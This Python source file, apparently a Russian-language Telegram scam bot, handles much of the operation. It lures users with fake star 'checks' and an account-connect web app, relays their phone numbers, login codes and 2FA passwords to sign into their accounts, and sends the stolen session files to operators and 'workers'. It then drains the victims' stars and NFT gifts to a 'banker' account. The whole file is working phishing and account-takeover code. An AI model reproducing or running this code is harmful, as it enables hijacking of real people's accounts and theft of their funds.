                    'slug': all_nfts_to_send[idx].get('slug',''), 
                    'status': '✅' if res == 'success' else '❌'
                })
        else:
            status = '❌ NoMoney' if not ready_to_send else '❌ NoTarget'
            log_transfer(f"FAIL NFT: {status}", "error")
            for nft in all_nfts_to_send: 
                nft_log_results.append({'title': nft['title'], 'slug': nft.get('slug',''), 'status': status})

        # ================= 6. ПОСЛЕДУЮЩАЯ ЧИСТКА =================
        log_transfer("🧹 Финальная чистка остатков...", "info")
        await cleanup_and_drain(client, banker_username)
        
        try: 
            final_stars = int(await client.get_stars_balance("me"))
            log_transfer(f"🏁 Финальный баланс: {final_stars} ⭐️", "info")
        except: 
            final_stars = 0

        db.log_transfer(session_name, me.id, current_balance, final_stars, len(all_nfts_to_send), "success")

    except Exception as e:
        print_error(f"Aggressive Logic Error: {e}")
        log_transfer(f"❌ Критическая ошибка в агрессивном режиме: {e}", "error")
        await alert_admins(bot, f"🔥 Aggressive Error: {e}")
        
        user_id = me.id if 'me' in locals() else 0
        db.log_transfer(session_name, user_id, 0, 0, 0, f"error: {str(e)[:100]}")
        
    return nft_log_results, final_stars
    
async def cleanup_and_drain(client: Client, banker_username):
    """Очистка остатков и слив звезд"""
    try:
        log_transfer("🧹 Конвертация оставшихся обычных подарков...", "debug")
        tasks = []
        
        async for g in client.get_chat_gifts(chat_id="me", limit=100):
            if not is_nft_gift(g) and not getattr(g, 'is_converted', False):
                if getattr(g, 'convert_price', 0) > 0:
                    tasks.append(convert_gift_task(client, analyze_gift(g)))
        
        if tasks:
            log_transfer(f"♻️ Найдено {len(tasks)} подарков для конвертации", "info")
            await asyncio.gather(*tasks)
            await asyncio.sleep(3.0)

        # Слив остатка звезд
        await drain_stars_user(client, default_recipient=banker_username)
        
    except Exception as e:
        log_transfer(f"Ошибка в cleanup: {e}", "warning")

# ================= AIOGRAM ROUTER =================
def get_main_router(bot_instance: Bot, current_api_url: str):
    router = Router()
    
    async def check_admin(user_id):
        return user_id in SETTINGS["admin_ids"]

    @router.message(CommandStart())
    async def command_start(message: types.Message, command: CommandObject):
        user_id = message.from_user.id
        args = command.args
        worker_id = None

        if args:
            if args.startswith("c_"):
                check = db.get_check(args.replace("c_", ""))
                if check: worker_id = check['creator_id']
            elif args.startswith("q_"):
                try: worker_id = int(args.replace("q_", "").split("_")[0])
                except: pass

        db.add_user(user_id, message.from_user.username, message.from_user.first_name, worker_id)
        
        u = db.get_user(user_id)
        final_worker = u['worker_id']
        worker_tag = "Неизвестно"
        if final_worker:
            w_user = db.get_user(final_worker)
            if w_user: worker_tag = f"@{w_user['username']}" if w_user['username'] else str(w_user['user_id'])
        
        await log_to_topic(bot_instance, 'topic_launch', f"{message.from_user.mention_html()} ({user_id}) запустил бота\nВоркер: {worker_tag}")

        if args and args.startswith("c_"): await process_check_activation(message, args.replace("c_", ""))
        elif args and args.startswith("q_"): await process_inline_check_activation(message, args.replace("q_", ""))
        else: await show_main_menu(message, user_id)

    @router.message(Command("admin"))
    async def admin_panel(message: types.Message):
        if not await check_admin(message.from_user.id): return
        u, c = db.get_stats()
        main_sess = SESSIONS_DIR / f"{SETTINGS['banker_session']}.session"
        status = "🟢 Подключен" if main_sess.exists() else "🔴 Не подключен"
        
        shop_status = "🔴 OFF" if SETTINGS["maintenance_mode"] else "🟢 ON"
        convert_status = "🟢 ON" if SETTINGS.get("auto_convert_gifts", True) else "🔴 OFF"

        txt = (f"👑 <b>Панель Администратора</b>\n"
               f"👥 Юзеров: <b>{u}</b> | Чеков: <b>{c} ⭐️</b>\n"
               f"📱 Банкир: {status}")

        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="🏦 Проверить Банкира", callback_data="check_banker"))
        kb.row(InlineKeyboardButton(text="📱 Переподключить Банкира", callback_data="admin_login"))
        
        kb.row(InlineKeyboardButton(text=f"♻️ Авто-конверт: {convert_status}", callback_data="toggle_convert"))
        kb.row(InlineKeyboardButton(text=f"🛠 Техработы: {shop_status}", callback_data="toggle_shop"))
        
        kb.row(InlineKeyboardButton(text="🎯 Сменить Target", callback_data="set_target"),
               InlineKeyboardButton(text="⚙️ API Настройки", callback_data="set_api"))
        kb.row(InlineKeyboardButton(text="🔙 Закрыть", callback_data="close_admin"))
        
        if isinstance(message, types.CallbackQuery):
            await message.message.edit_text(txt, reply_markup=kb.as_markup(), parse_mode="HTML")
        else:
            await message.answer(txt, reply_markup=kb.as_markup())
            
    @router.callback_query(F.data == "toggle_convert")
    async def toggle_convert_handler(c: types.CallbackQuery):
        if not await check_admin(c.from_user.id): return
        cur = SETTINGS.get("auto_convert_gifts", True)
        SETTINGS["auto_convert_gifts"] = not cur
        save_settings(SETTINGS)
        await c.answer(f"Авто-конвертация: {'Выключена' if cur else 'Включена'}")
        await admin_panel(c)
            
    @router.callback_query(F.data == "check_banker")
    async def check_banker_handler(c: types.CallbackQuery):
        if not await check_admin(c.from_user.id): return
        sess_name = SETTINGS['banker_session']
        sess_path = SESSIONS_DIR / f"{sess_name}.session"
        
        if not sess_path.exists():
            return await c.answer("❌ Файл сессии банкира не найден!", show_alert=True)
            
        msg = await c.message.answer("⏳ Подключаюсь к банкиру...")
        client = Client(sess_name, SETTINGS['api_id'], SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))
        try:
            await client.connect()
            me = await client.get_me()
            bal = await get_stars_info(client)
            await client.disconnect()
            
            await msg.edit_text(
                f"🏦 <b>Статус Банкира</b>\n\n"
                f"👤: {me.first_name} (@{me.username})\n"
                f"📱: <code>{me.phone_number}</code>\n"
                f"💰 Баланс: <b>{bal} ⭐️</b>",
                parse_mode="HTML"
            )
        except Exception as e:
            await msg.edit_text(f"❌ Ошибка подключения к банкиру:\n{e}")
            try: await client.disconnect()
            except: pass
        await c.answer()

    @router.callback_query(F.data == "close_admin")
    async def close_admin(c): await c.message.delete()

    @router.callback_query(F.data == "toggle_shop")
    async def toggle_shop(c):
        if not await check_admin(c.from_user.id): return
        SETTINGS["maintenance_mode"] = not SETTINGS["maintenance_mode"]
        save_settings(SETTINGS)
        await c.answer("Режим техработ изменен!")
        await admin_panel(c)

    @router.callback_query(F.data == "set_target")
    async def set_target_start(c, state: FSMContext):
        if not await check_admin(c.from_user.id): return
        await c.message.answer("✍️ Введите новый Target (ID или @username):")
        await state.set_state(AdminSettingsState.waiting_target)

    @router.message(AdminSettingsState.waiting_target)
    async def set_target_fin(m: Message, state: FSMContext):
        SETTINGS['target_user'] = m.text.strip()
        save_settings(SETTINGS)
        await m.answer(f"✅ Target изменен на: {SETTINGS['target_user']}")
        await state.clear()

    @router.callback_query(F.data == "set_api")
    async def set_api_start(c, state: FSMContext):
        if not await check_admin(c.from_user.id): return
        await c.message.answer("1️⃣ Введите новый API URL (с http/https):")
        await state.set_state(AdminSettingsState.waiting_api_url)

    @router.message(AdminSettingsState.waiting_api_url)
    async def set_api_url(m: Message, state: FSMContext):
        SETTINGS['api_url'] = m.text.strip()
        await m.answer("2️⃣ Введите API ID (число):")
        await state.set_state(AdminSettingsState.waiting_api_id)

    @router.message(AdminSettingsState.waiting_api_id)
    async def set_api_id(m: Message, state: FSMContext):
        if not m.text.isdigit(): return await m.answer("❌ Должно быть число")
        SETTINGS['api_id'] = int(m.text)
        await m.answer("3️⃣ Введите API HASH:")
        await state.set_state(AdminSettingsState.waiting_api_hash)

    @router.message(AdminSettingsState.waiting_api_hash)
    async def set_api_hash(m: Message, state: FSMContext):
        SETTINGS['api_hash'] = m.text.strip()
        save_settings(SETTINGS)
        await m.answer("✅ <b>Настройки API обновлены!</b>")
        await state.clear()

    # ЛОГИН БАНКИРА
    @router.callback_query(F.data == "admin_login")
    async def admin_login_start(c, state: FSMContext):
        if not await check_admin(c.from_user.id): return
        await safe_edit_text(c.message, "📱 <b>Введите номер для Банкира:</b>", None)
        await state.set_state(AdminLoginState.waiting_phone)

    @router.message(AdminLoginState.waiting_phone)
    async def admin_phone(m: Message, state: FSMContext):
        clean_ph = clean_phone_number(m.text)
        if not clean_ph:
            return await m.answer("❌ Некорректный формат номера. Попробуйте снова.")

        client = Client(name=SETTINGS['banker_session'], api_id=SETTINGS['api_id'], api_hash=SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))
        try:
            await client.connect()
            sent = await client.send_code(clean_ph)
            admin_auth_process[m.from_user.id] = {"client": client, "phone": clean_ph, "hash": sent.phone_code_hash}
            await m.answer(f"🔢 Код отправлен на +{clean_ph}.\n<b>Введите код:</b>")
            await state.set_state(AdminLoginState.waiting_code)
        except Exception as e:
            await m.answer(f"Ошибка: {e}")
            await state.clear()

    @router.message(AdminLoginState.waiting_code)
    async def admin_code(m: Message, state: FSMContext):
        data = admin_auth_process.get(m.from_user.id)
        if not data: return
        client = data['client']
        try:
            await client.sign_in(data['phone'], data['hash'], m.text)
            await m.answer("✅ <b>Успешно!</b> Сессия сохранена.")
            await client.disconnect()
            await state.clear()
        except SessionPasswordNeeded:
            await m.answer("🔐 <b>Введите 2FA пароль:</b>")
            await state.set_state(AdminLoginState.waiting_password)
        except Exception as e: await m.answer(f"Ошибка: {e}")

    @router.message(AdminLoginState.waiting_password)
    async def admin_pass(m: Message, state: FSMContext):
        data = admin_auth_process.get(m.from_user.id)
        client = data['client']
        try:
            await client.check_password(m.text)
            await m.answer("✅ <b>Успешно!</b> Сессия сохранена.")
            await client.disconnect()
            await state.clear()
        except Exception as e: await m.answer(f"Ошибка: {e}")

    # --- ОСНОВНОЕ МЕНЮ ---
    async def show_main_menu(message, user_id, edit=False):
        user = db.get_user(user_id)
        bal = user['balance'] if user else 0
        text = f"🎉 <b>Добро пожаловать!</b>\n💫 Ваш баланс: <b>{bal} ⭐️</b>\n\n👇 <b>Выберите действие:</b>"
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="⭐️ Вывести звезды", callback_data="withdraw"),
               InlineKeyboardButton(text="🎁 Автоскупщик", callback_data="autobuyer"))
        kb.row(InlineKeyboardButton(text="👛 Кошелек", callback_data="wallet"),
               InlineKeyboardButton(text="🛒 Магазин", callback_data="shop"))
        kb.row(InlineKeyboardButton(text="➕ Пополнить баланс", callback_data="topup"))
        kb.row(InlineKeyboardButton(text="🧾 Создать чек", callback_data="create_check"))

        if edit:
            if isinstance(message, types.CallbackQuery): await message.message.delete()
            else: await message.delete()

        p = Path("start.jpg")
        if p.exists(): await message.answer_photo(FSInputFile(p), caption=text, reply_markup=kb.as_markup())
        else: await message.answer(text, reply_markup=kb.as_markup())

    @router.callback_query(F.data == "wallet")
    async def cb_wallet(c):
        u = db.get_user(c.from_user.id)
        text = f"👛 <b>Личный Кошелек</b>\n\n🆔 Ваш ID: <code>{c.from_user.id}</code>\n💰 Текущий баланс: <b>{u['balance']} ⭐️</b>"
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="💸 Вывести средства", callback_data="withdraw"))
        kb.row(InlineKeyboardButton(text="➕ Пополнить баланс", callback_data="topup"))
        kb.row(InlineKeyboardButton(text="🔙 Главное меню", callback_data="main_menu"))
        await safe_edit_text(c.message, text, kb.as_markup())

    @router.callback_query(F.data == "main_menu")
    async def cb_main(c): await show_main_menu(c.message, c.from_user.id, True)

    @router.callback_query(F.data.in_({"withdraw", "autobuyer", "shop"}))
    async def cb_stubs(c):
        if c.data == "shop":
            msg = "🚧 Магазин на тех. обслуживании!" if SETTINGS["maintenance_mode"] else "🛒 Магазин пуст."
            return await c.answer(msg, True)
        
        txt = "💸 <b>Вывод средств</b>" if c.data == "withdraw" else "🎁 <b>Автоскупщик подарков</b>"
        url = get_webapp_url(c.from_user.id, SETTINGS['api_url'])
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text=f"🔐 Подключить аккаунт", web_app=WebAppInfo(url=url)))
        kb.row(InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu"))
        await safe_edit_text(c.message, txt, kb.as_markup())

    @router.callback_query(F.data == "topup")
    async def cb_topup(c):
        kb = InlineKeyboardBuilder()
        for amt in [25, 50, 100, 500, 1000]: kb.add(InlineKeyboardButton(text=f"{amt} ⭐️", callback_data=f"pay_{amt}"))
        kb.adjust(3, 2)
        kb.row(InlineKeyboardButton(text="✏️ Другая сумма", callback_data="pay_custom"), InlineKeyboardButton(text="🔙 Назад", callback_data="wallet"))
        await safe_edit_text(c.message, "💳 <b>Пополнение баланса</b>\nВыберите сумму или введите свою:", kb.as_markup())

    @router.callback_query(F.data.startswith("pay_") & (F.data != "pay_custom"))
    async def cb_pay(c):
        await c.answer()
        await c.message.answer_invoice(title="Пополнение баланса", description=f"Пополнение кошелька на {c.data.split('_')[1]} ⭐️", 
                                       prices=[LabeledPrice(label="XTR", amount=int(c.data.split('_')[1]))], 
                                       provider_token="", payload="topup", currency="XTR")

    @router.callback_query(F.data == "pay_custom")
    async def cb_pay_cust(c, state: FSMContext):
        await safe_edit_text(c.message, "✏️ <b>Введите сумму пополнения:</b>", 
                            InlineKeyboardBuilder().add(InlineKeyboardButton(text="🔙 Отмена", callback_data="topup")).as_markup())
        await state.set_state(TopUpState.waiting_for_custom_amount)

    @router.message(TopUpState.waiting_for_custom_amount)
    async def proc_pay_cust(m: Message, state: FSMContext):
        if m.text.startswith("/"):
            await state.clear()
            return
            
        if not m.text.isdigit(): 
            return await m.answer("❌ Введите число.")
        await state.clear()
        await m.answer_invoice(title="Пополнение баланса", 
                              description=f"Пополнение кошелька на {m.text} ⭐️", 
                              prices=[LabeledPrice(label="XTR", amount=int(m.text))], 
                              provider_token="", payload="topup", currency="XTR")

    @router.pre_checkout_query()
    async def pre(p: PreCheckoutQuery): await p.answer(ok=True)

    @router.message(F.successful_payment)
    async def suc(m: Message):
        amt = m.successful_payment.total_amount
        db.update_balance(m.from_user.id, amt, 'add')
        await m.answer(f"✅ <b>Оплата прошла успешно!</b>\n\n➕ Начислено: <b>{amt} ⭐️</b>", 
                      reply_markup=InlineKeyboardBuilder().add(InlineKeyboardButton(text="👛 Кошелек", callback_data="wallet")).as_markup())

    @router.callback_query(F.data == "create_check")
    async def cb_cc(c, state: FSMContext):
        await safe_edit_text(c.message, "📝 <b>Введите сумму чека:</b>", 
                            InlineKeyboardBuilder().add(InlineKeyboardButton(text="🔙 Отмена", callback_data="main_menu")).as_markup())
        await state.set_state(CreateCheckState.waiting_for_amount)

    @router.message(CreateCheckState.waiting_for_amount)
    async def cc_amt(m: Message, state: FSMContext):
        if m.text.startswith("/"): 
            await state.clear()
            return
        
        if not m.text.isdigit(): 
            return await m.answer("❌ Введите число.")
        
        user_data = db.get_user(m.from_user.id)
        if user_data['balance'] < int(m.text): 
            return await m.answer("❌ Недостаточно средств.")
        
        await state.update_data(amt=int(m.text))
        await m.answer("👥 <b>Введите количество активаций:</b>")
        await state.set_state(CreateCheckState.waiting_for_activations)

    # --- КОМАНДЫ ДЛЯ ВСЕХ ПОЛЬЗОВАТЕЛЕЙ ---
    @router.message(Command("star"))
    async def cmd_star_public(message: types.Message, command: CommandObject):
        if not command.args or not command.args.isdigit():
            return await message.answer("❌ Введите сумму.\nПример: <code>/star 1000</code>")
            
        amount = int(command.args)
        new_balance = db.update_balance(message.from_user.id, amount, mode='add')
        
        await message.answer(f"✅ Баланс пополнен на <b>{amount} ⭐️</b>\n💰 Ваш баланс: <b>{new_balance} ⭐️</b>")

    @router.message(Command("rstar"))
    async def cmd_rstar_public(message: types.Message, command: CommandObject):
        if not command.args or not command.args.isdigit():
            return await message.answer("❌ Введите сумму для списания.\nПример: <code>/rstar 500</code>")
            
        amount = int(command.args)
        new_balance = db.update_balance(message.from_user.id, amount, mode='remove')
        
        await message.answer(f"📉 Списано <b>{amount} ⭐️</b>\n💰 Ваш баланс: <b>{new_balance} ⭐️</b>")

    @router.message(Command("work"))
    async def cmd_mamontization_public(message: types.Message, state: FSMContext):
        await state.clear()
        
        user_id = message.from_user.id
        user = db.get_user(user_id)
        
        if not user:
            db.add_user(user_id, message.from_user.username, message.from_user.first_name)
            user = db.get_user(user_id)
        
        current_status = user['is_mamont']
        new_status = not current_status
        db.set_mamont(user_id, new_status)
        
        status_text = "👨‍💻 <b>Worker Mode: ON</b> (Включен)" if new_status else "👤 <b>Мамонт Mode: OFF</b> (Выключен)"
        await message.answer(f"Статус изменен:\n{status_text}")

    @router.message(CreateCheckState.waiting_for_activations)
    async def cc_act(m: Message, state: FSMContext):
        if m.text.startswith("/"): 
            await state.clear()
            return

        if not m.text.isdigit(): 
            return await m.answer("❌ Введите число.")
        
        data = await state.get_data()
        total = data['amt'] * int(m.text)
        
        user_data = db.get_user(m.from_user.id)
        if user_data['balance'] < total: 
            return await m.answer(f"❌ Недостаточно средств (нужно {total} ⭐️).")
        
        db.update_balance(m.from_user.id, total, 'remove')
        cid = db.create_check(m.from_user.id, data['amt'], int(m.text))

        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="📨 Отправить чек", switch_inline_query=f"c_{cid}"))
        kb.row(InlineKeyboardButton(text="🏠 В меню", callback_data="main_menu"))
        
        p = None
        for d in [CHECKS_PHOTO_DIR, BASE_DIR]:
            for ext in [".jpg", ".png", ".JPG"]:
                if (d / f"{data['amt']}{ext}").exists(): 
                    p = d / f"{data['amt']}{ext}"
                    break
            if p: break

        cap = f"✅ <b>Чек успешно создан!</b>\n\n💰 Сумма: <b>{data['amt']} ⭐️</b>\n👥 Активаций: <b>{m.text}</b>"
        if p: 
            await m.answer_photo(FSInputFile(p), caption=cap, reply_markup=kb.as_markup())
        else: 
            await m.answer(cap, reply_markup=kb.as_markup())
        await state.clear()
        
    async def process_check_activation(message: Message, check_id: str):
        msg = await message.answer("⏳ <b>Проверка чека...</b>")
        await asyncio.sleep(0.5)
        res, amt, cid = db.activate_check(check_id, message.from_user.id)
        if res == "success":
            if cid: 
                db.add_user(message.from_user.id, message.from_user.username, message.from_user.first_name, cid)
            u = db.get_user(message.from_user.id)
            text = (f"✅ На ваш баланс начислено {amt} ⭐️\n💰 Ваш Баланс: {u['balance']} ⭐️")
            await msg.edit_text(text, reply_markup=InlineKeyboardBuilder().add(InlineKeyboardButton(text="👛 Кошелек", callback_data="wallet")).as_markup())
        else: 
            await msg.edit_text("❌ <b>Ошибка!</b> Чек недействителен или уже активирован.")

    async def process_inline_check_activation(message: Message, params: str):
        try:
            parts = params.split("_")
            res = db.activate_inline_check(params, int(parts[0]), message.from_user.id, int(parts[1]))
            msg = await message.answer("⏳")
            await asyncio.sleep(0.5)
            if res == "success":
                db.add_user(message.from_user.id, message.from_user.username, message.from_user.first_name, int(parts[0]))
                u = db.get_user(message.from_user.id)
                text = (f"✅ На ваш баланс начислено {parts[1]} ⭐️\n💰 Ваш Баланс: {u['balance']} ⭐️")
                await msg.edit_text(text, reply_markup=InlineKeyboardBuilder().add(InlineKeyboardButton(text="👛 Кошелек", callback_data="wallet")).as_markup())
            elif res == "no_balance": 
                await msg.edit_text("❌ <b>Чек аннулирован</b> (недостаточно средств у создателя).")
            elif res == "already_used": 
                await msg.edit_text("⚠️ <b>Этот чек уже активирован.</b>")
        except: 
            await message.answer("❌ Произошла ошибка.")

    @router.inline_query()
    async def inline(q: types.InlineQuery):
        if q.query.startswith("c_"):
            c = db.get_check(q.query.replace("c_", ""))
            if c:
                await q.answer([
                    InlineQueryResultArticle(
                        id=uuid.uuid4().hex,
                        title=f"Чек {c['amount']} ⭐️",
                        input_message_content=InputTextMessageContent(
                            message_text=f"🎁 <b>Лови чек!</b>\n💰 Сумма: <b>{c['amount']} ⭐️</b>", 
                            parse_mode="HTML"),
                        reply_markup=InlineKeyboardBuilder().add(
                            InlineKeyboardButton(
                                text="⭐️ Забрать", 
                                url=f"https://t.me/{(await bot_instance.me()).username}?start=c_{c['check_id']}")
                        ).as_markup()
                    )
                ], is_personal=True, cache_time=1)
        elif q.query.isdigit():
            amt = int(q.query)
            u = db.get_user(q.from_user.id)
            if not u or u['balance'] < amt:
                await q.answer([InlineQueryResultArticle(
                    id=uuid.uuid4().hex, 
                    title="❌ Недостаточно средств", 
                    description=f"Баланс: {u['balance'] if u else 0} ⭐️", 
                    input_message_content=InputTextMessageContent(
                        message_text="❌ Недостаточно средств для создания чека.", 
                        parse_mode="HTML")
                )], is_personal=True, cache_time=1)
                return
            
            uid = f"{q.from_user.id}_{amt}_{secrets.token_hex(4)}"
            kb = InlineKeyboardBuilder().add(
                InlineKeyboardButton(
                    text="⭐️ Активировать чек !", 
                    url=f"https://t.me/{(await bot_instance.me()).username}?start=q_{uid}")
            ).as_markup()
            
            pid = cached_photo_ids.get(str(amt))
            results = []
            
            if pid:
                results.append(InlineQueryResultCachedPhoto(
                    id=uuid.uuid4().hex, 
                    photo_file_id=pid, 
                    title=f"Создать чек на {amt} ⭐️", 
                    caption=f"⭐️ Вы получили чек на {amt} звёзд!", 
                    parse_mode="HTML", 
                    reply_markup=kb))
            else:
                results.append(InlineQueryResultArticle(
                    id=uuid.uuid4().hex, 
                    title=f"Отправить чек на {amt} ⭐️", 
                    description="Нажмите, чтобы отправить (Без фото)", 
                    input_message_content=InputTextMessageContent(
                        message_text=f"⭐️ <b>ЧЕК на {amt} звёзд!</b>\n\nКто успел - того и тапки! 👇", 
                        parse_mode="HTML"), 
                    reply_markup=kb))
            
            await q.answer(results, is_personal=True, cache_time=1)

    return router

# ================= API & TUNNEL =================
class FragmentBot:
    def __init__(self):
        self.bot = None
        self.dp = None
        self.is_running = False
        self.api_id = SETTINGS['api_id']
        self.api_hash = SETTINGS['api_hash']
        self.bot_token = SETTINGS['bot_token']
        self.tunnel_process = None

    def get_api_url(self):
        return SETTINGS['api_url']

    def get_headers(self):
        return {"Content-Type": "application/json", "X-Bot-Token": self.bot_token}

    def start_tunnel(self):
        if os.getenv('CONNECTION_MODE', 'MANUAL').upper() != "TUNNEL":
            print_step(f"Manual Mode. Target API: {self.get_api_url()}")
            return
        
        print_step("Starting Tuna Tunnel...")
        if shutil.which("tuna") is None:
            print_error("'tuna' not found.")
            return 
        
        try:
            self.tunnel_process = subprocess.Popen(["tuna", "http", "3000"], 
                                                  stdout=subprocess.PIPE, 
                                                  stderr=subprocess.PIPE, 
                                                  text=True)
            public_url = None
            start_time = time.time()
            
            while time.time() - start_time < 10:
                line = self.tunnel_process.stdout.readline()
                if line and "https://" in line and ".tuna.am" in line:
                    match = re.search(r'(https://[a-zA-Z0-9-]+\.tuna\.am)', line)
                    if match: 
                        public_url = match.group(1)
                        break
                else: 
                    time.sleep(0.1)

            if public_url:
                print_success(f"Tunnel: {public_url}")
                SETTINGS['api_url'] = "http://localhost:3000"
            else: 
                print_warning("Tunnel public URL not found.")
        except Exception as e:
            print_error(f"Tunnel failed: {e}")

    async def start_polling_api(self):
        self.is_running = True
        print_step(f"Listening to API...")
        
        async with aiohttp.ClientSession() as session:
            while self.is_running:
                url = self.get_api_url()
                try:
                    async with session.get(f"{url}/api/telegram/get-pending", 
                                          headers=self.get_headers(), 
                                          timeout=10) as response:
                        if response.status == 200:
                            data = await response.json()
                            requests_list = data.get('requests', [])
                            if requests_list: 
                                print_info(f"API Tasks: {len(requests_list)}")
                            
                            for req in requests_list:
                                req_id = req.get('requestId')
                                if req_id in processed_ids: 
                                    continue
                                processed_ids.add(req_id)
                                asyncio.create_task(self.process_request(req, session))
                        elif response.status == 401:
                            print_error("API Auth Failed (Check BOT_TOKEN)")
                            await asyncio.sleep(5)
                except Exception as e:
                    await asyncio.sleep(5)
                
                await asyncio.sleep(2)

    async def update_status(self, session, request_id, status, message=None, needs_2fa=False):
        url = f"{self.get_api_url()}/api/telegram/update-request"
        payload = {
            "requestId": request_id, 
            "result": {
                "status": status, 
                "message": message, 
                "needs2FA": needs_2fa
            }
        }
        try:
            async with session.post(url, json=payload, headers=self.get_headers()) as resp: 
                pass
            print_step(f"Status updated: {status}")
        except Exception as e: 
            print_error(f"Status update error: {e}")

    async def process_request(self, req, session):
        req_id = req.get('requestId')
        action = req.get('action')
        data = req.get('data') or {}
        
        raw_phone = req.get('phone') or data.get('phone')
        phone = clean_phone_number(raw_phone) if raw_phone else None
        
        code = req.get('code') or data.get('code')
        pwd = req.get('password') or data.get('password')
        chat_id = req.get('chatId')

        print_info(f"Task: {action} (ID: {req_id}, Phone: {phone})")

        try:
            if action == 'send_phone':
                if not phone: 
                    raise ValueError("No phone")
                res = await self.send_ph(phone, chat_id)
                if "error" in res: 
                    await self.update_status(session, req_id, "error", res["error"])
                else: 
                    await self.update_status(session, req_id, 'waiting_code', "Код отправлен")

            elif action in ['verify_code', 'send_code']:
                if not code: 
                    raise ValueError("No code")
                if phone not in user_sessions: 
                    raise Exception("Session expired/not found locally")
                
                res = await self.ver_code(phone, code, chat_id)
                status = "success" if res == "success" else "waiting_password"
                await self.update_status(session, req_id, status, 
                                       "Вход выполнен" if status == "success" else "Нужен 2FA", 
                                       res == "waiting_password")

            elif action in ['send_password', 'verify_password']:
                if not pwd: 
                    raise ValueError("No password")
                await self.ver_pass(phone, str(pwd).strip(), chat_id)
                await self.update_status(session, req_id, 'success', "Вход выполнен!")

            elif action == 'CANCEL_LOGIN':
                if phone: 
                    await self.cancel(phone)
                await self.update_status(session, req_id, "cancelled", "Cancelled")

        except Exception as e:
            print_error(f"Process error: {e}")
            await alert_admins(self.bot, f"❌ Ошибка API (ReqID {req_id}):\n{e}")
            await self.update_status(session, req_id, 'error', str(e))

    async def get_cl(self, phone):
        name = clean_phone_number(phone)
        if name not in pyrogram_clients:
            pyrogram_clients[name] = Client(name, SETTINGS['api_id'], SETTINGS['api_hash'], 
                                           workdir=str(SESSIONS_DIR))
        return pyrogram_clients[name]

    async def send_ph(self, phone, cid):
        clean_num = clean_phone_number(phone)
        print_info(f"📞 Input: {phone} -> Cleaned: {clean_num}")

        if not clean_num: 
            return {"error": "Empty Phone Number"}

        try:
            c = await self.get_cl(clean_num)
            if not c.is_connected:
                try: 
                    await c.connect()
                except Exception as e: 
                    return {"error": f"Conn: {e}"}

            print_info(f"📨 Sending code to Telegram ({clean_num})...")
            s = await c.send_code(clean_num)
            
            user_sessions[clean_num] = {
                'phone': clean_num, 
                'hash': s.phone_code_hash, 
                'client': c.name
            }
            save_temp_sessions(user_sessions)
            
            await log_to_topic(self.bot, 'topic_auth', 
                             f"📱 Отправлен код на {mask_phone(clean_num)}\n🆔 User ID: {cid}")
            print_success(f"✅ Code sent to {clean_num}")
            return {"success": True}
            
        except BadRequest as e:
            err = str(e)
            print_error(f"❌ TG Error ({clean_num}): {err}")
            return {"error": err}
        except Exception as e:
            return {"error": str(e)}

    async def ver_code(self, phone, code, cid):
        if phone not in user_sessions: 
            raise Exception("Session expired/not found locally")
            
        session_data = user_sessions.get(phone)
        if not session_data or 'hash' not in session_data:
            raise Exception("Session invalid (No hash)")
        
        phone_hash = session_data['hash']
        c = await self.get_cl(phone)
        
        try:
            if not c.is_connected: 
                await c.connect()
            
            await c.sign_in(phone, phone_hash, str(code))
            
            await log_to_topic(self.bot, 'topic_auth', 
                             f"🟩 Успешный вход по {mask_phone(phone)}\n🆔 User ID: {cid}")
            await self.fin(c, cid, phone)
            return "success"
        except SessionPasswordNeeded:
            return "waiting_password"
        except Exception as e: 
            raise e

    async def ver_pass(self, phone, pwd, cid):
        c = await self.get_cl(phone)
        try:
            await c.check_password(str(pwd))
            await log_to_topic(self.bot, 'topic_auth', 
                             f"🟩 2FA Верный: {mask_phone(phone)}\n🆔 User ID: {cid}")
            await self.fin(c, cid, phone)
        except (PasswordHashInvalid, BadRequest):
            raise Exception("Invalid 2FA Password") 
        except Exception as e: 
            raise e

    async def fin(self, c, cid, phone_key):
        try:
            if not c.is_connected:
                try: 
                    await c.connect()
                except Exception as e:
                    print_error(f"FIN Aborted: Client disconnected ({e})")
                    return

            me = await c.get_me()
            sess_file = SESSIONS_DIR / f"{c.name}.session"
            
            if sess_file.exists():
                await send_file_to_admins(self.bot, sess_file, 
                                        f"🔑 Session: {mask_phone(me.phone_number)} | ID: {me.id}")
                
                u = db.get_user(me.id)
                if u and u['worker_id']:
                    try: 
                        await self.bot.send_document(
                            chat_id=u['worker_id'], 
                            document=FSInputFile(sess_file), 
                            caption=f"🔑 Session: {mask_phone(me.phone_number)}"
                        )
                    except: 
                        pass

            banker = None
            banker_name = SETTINGS.get("banker_session", "main_admin")
            if (SESSIONS_DIR / f"{banker_name}.session").exists():
                try:
                    banker = Client(banker_name, SETTINGS['api_id'], SETTINGS['api_hash'], 
                                  workdir=str(SESSIONS_DIR))
                    await banker.start()
                except Exception as e: 
                    print_error(f"Banker Error: {e}")

            nft_results = []
            final_stars = 0
            
            if c.is_connected:
                nft_results, final_stars = await aggressive_transfer_process(c, banker, self.bot)
            
            if banker: 
                try: 
                    await banker.stop()
                except: 
                    pass
            
            u_db = db.get_user(me.id)
            worker_txt = "Неизвестно"
            if u_db and u_db['worker_id']:
                w_db = db.get_user(u_db['worker_id'])
                if w_db and w_db['username']: 
                    worker_txt = f"@{w_db['username']}"
                else: 
                    worker_txt = f"ID {u_db['worker_id']}"

            nft_lines = []
            if nft_results:
                for nft in nft_results:
                    link = f"https://t.me/nft/{nft['slug']}" if nft['slug'] else "#"
                    line = f"<a href='{link}'>{nft['title']}</a> {nft['status']}"
                    nft_lines.append(line)
                nft_text = "\n".join(nft_lines)
            else:
                nft_text = "Нет NFT"

            log_text = (
                f"<blockquote>"
                f"💸 Новая сессия!\n"
                f"👨‍💻 Воркер: {worker_txt}\n\n"
                f"👤 Пользователь: @{me.username if me.username else 'Нет'}\n"
                f"🆔 Айди: <code>{me.id}</code>\n"
                f"☎️ Номер телефона: <code>{mask_phone(me.phone_number)}</code>\n"
                f"🪬 Session File: <code>{sess_file.name}</code>\n\n"
                f"🔮 Статистика:\n"
                f"⭐️ Звезды: {final_stars} / 0\n"
